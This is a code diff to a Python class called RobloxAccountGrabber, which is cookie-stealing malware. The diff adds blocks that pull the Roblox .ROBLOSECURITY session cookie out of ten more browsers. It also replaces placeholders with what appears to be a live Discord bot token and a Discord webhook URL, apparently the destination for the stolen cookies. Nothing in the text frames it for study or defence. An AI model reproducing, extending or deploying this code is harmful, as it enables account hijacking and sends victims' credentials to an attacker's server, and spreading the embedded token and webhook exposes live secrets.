@@ -373,6 +373,106 @@ class RobloxAccountGrabber:
         except:
             pass
 
+        try:
+            self.platform = "Vivaldi"
+            for cookie in browser_cookie3.vivaldi(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Internet Explorer"
+            for cookie in browser_cookie3.internet_explorer(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Edge (Legacy)"
+            for cookie in browser_cookie3.edge_legacy(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Firefox ESR"
+            for cookie in browser_cookie3.firefox_esr(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Brave Beta"
+            for cookie in browser_cookie3.brave_beta(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Pale Moon"
+            for cookie in browser_cookie3.pale_moon(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Waterfox"
+            for cookie in browser_cookie3.waterfox(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Yandex Browser"
+            for cookie in browser_cookie3.yandex(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Midori"
+            for cookie in browser_cookie3.midori(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Maxthon Browser"
+            for cookie in browser_cookie3.maxthon(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
         if len(self.embeds) == 0:
             sys.exit()  # Use sys.exit() instead of exit()
 
@@ -534,8 +634,8 @@ class RobloxAccountGrabber:
             embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
             await ctx.send(embed=embed)
 
-        client.run('YOUR_BOT_TOKEN')
+        client.run('MTEzNzkzOTQwNDcwNzYwNjY2OQ.Gis2dA.8bWbSO0RK0XWNhu0vonC8Dw3-6u0BPdL-Gynqs')
 
 
 RobloxAccountGrabber(
-    "YOUR_DISCORD_WEBHOOK")
+    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
